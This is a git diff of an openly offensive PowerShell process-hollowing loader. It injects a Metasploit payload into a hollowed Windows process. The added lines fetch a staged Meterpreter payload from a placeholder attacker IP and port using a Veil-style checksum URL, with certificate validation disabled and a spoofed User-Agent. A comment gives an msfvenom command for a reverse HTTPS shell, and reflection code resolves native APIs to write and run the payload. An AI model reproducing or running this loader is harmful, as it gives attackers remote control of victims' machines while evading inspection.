@@ -32,12 +32,51 @@ Optional Dependencies: None
     $parentProcessName = "svchost"
     $Binary = "C:\Windows\System32\taskhostw.exe"
 
+    $ip = "<Attacker IP>"
+    $port = "<MSF Handler Port>"
+
     #msfvenom -p windows/x64/meterpreter/reverse_https LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f ps1
-    [Byte[]] $buf = "Your payload here"
-
-
+    # [Byte[]] $buf = "Your payload here"
 #endregion Variables
 
+#region Retrieve Payload
+    ### Stolen from Veil Framework :sussmile:
+    # Reterieve the staged payload from metasploit multi/handler
+    $d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+    # Check validity
+    function c($v) { return (([Int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92) }
+    # Generate random string
+    function t { $f = ""; 1..56 | ForEach-Object { $f += $d[(Get-Random -Maximum $d.Length)] }; return $f }
+    # Shuffle array
+    function e { Process { [Array] $x = $x + $_ }; End { $x | Sort-Object {(New-Object Random).next()} } } 
+    # Generate URL
+    function g { for ($i = 0; $i -lt 64; $i++) { $h = t; $k = $d | e; foreach ($l in $k) { $s = $h + $l; if (c($s)) {return $s} } } return "9vXU" }
+    # Combine function c,t,e,g to generate URL
+    function GenMSFURL {
+    Param(
+        [String]$ip,
+        [String]$port
+    )
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+    [System.Net.ServicePointManager]::Expect100Continue = $True
+    [System.Net.ServicePointManager]::CheckCertificateRevocationList = $False
+    $URL = "https://" + $ip + $port + (g)
+    $client = New-Object System.Net.WebClient
+    $client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)")
+    [System.Byte[]] $payload = $client.DownloadData($URL)
+    $buf = [System.Array]::CreateInstance([byte], $payload.Length)
+    $payload.CopyTo($buf, 0)
+    $payload = $null
+
+    # $buf = New-Object Byte[] ($payload.Length)
+    # $payload.CopyTo($buf, 0)
+
+    # $payload = $payload[0..($payload.Length-1)]
+    # return $payload
+    }
+#endregion Retrieve Payload
+   
 function PrintArt {
 
 Write-Host "                                       _____  _____ _____ _____      "                      
@@ -74,24 +113,25 @@ Write-Host "Author: @bowtiejicode (https://github.com/bowtiejicode)"
 }
 
 function LookupFunc {
- Param ($moduleName, $functionName)
- $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
- Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
- Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
- $tmp=@()
- $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
- return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
-@($moduleName)), $functionName))
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+    @($moduleName)), $functionName))
 }
+
 function getDelegateType {
- Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
- $type = [AppDomain]::CurrentDomain.
- DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
- $type.
- DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
- $type.
- DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
- return $type.CreateType()
+    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+    $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
 }
 
 function DefineStruct{
@@ -324,6 +364,9 @@ PrintArt
         throw "[!] ReadProcessMemory for svchostbase failed"
     }
 
+    $buf = GenMSFURL -ip $ip -port $port
+
+
     [UInt32]$e_lfanew_offset = [bitconverter]::ToUInt32($data,0x3C)
     [UInt32]$opthdr = $e_lfanew_offset + 0x28;
     [UInt32]$entrypoint_rva = [bitconverter]::ToUInt32($data, [Int32]$opthdr);
@@ -339,6 +382,5 @@ PrintArt
     if ($result -eq -1){
         throw "[!] Failed to resume thread"
     }
+
     Write-Host "[+] Completed"
-
-
